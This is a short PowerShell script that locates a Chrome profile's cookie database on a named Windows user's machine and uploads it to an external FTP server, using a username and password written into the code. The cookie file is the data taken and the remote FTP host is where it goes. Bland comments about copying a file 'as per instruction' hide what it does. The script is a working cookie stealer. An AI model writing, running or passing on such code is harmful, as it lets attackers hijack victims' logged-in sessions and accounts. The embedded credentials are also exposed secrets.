# Define the source directories and the file name you want to copy
$sourceDir1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
$sourceDir2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies"

# FTP Server details
$ftpServer = "ftp://us-east-1.sftpcloud.io"
$ftpUser = "d45b8e2d698147e59f2234fd87b98082"
$ftpPassword = "CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p"
$ftpFilePath = "/" # Adjust the path on your FTP server

# Function to upload file to FTP server
function Upload-ToFtp($localFilePath, $ftpUrl, $ftpUser, $ftpPassword) {
    $webClient = New-Object System.Net.WebClient
    $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
    $uri = New-Object System.Uri($ftpUrl)
    $webClient.UploadFile($uri, $localFilePath)
}

# Step 1 & 2: Check if source directory 1 exists and copy file to FTP
if (Test-Path $sourceDir1) {
    $ftpUrl = $ftpServer + $ftpFilePath
    Upload-ToFtp $sourceDir1 $ftpUrl $ftpUser $ftpPassword
    Write-Host "File uploaded to FTP server from projects directory."
} else {
    Write-Host "The directory $sourceDir1 does not exist."
}

# Step 3 & 4: Check if source directory 2 exists. If not, ignore.
if (Test-Path $sourceDir2) {
    Write-Host "Directory $sourceDir2 exists. No action needed as per instruction."
} else {
    Write-Host "The directory $sourceDir2 does not exist. Ignoring as per instruction."
}

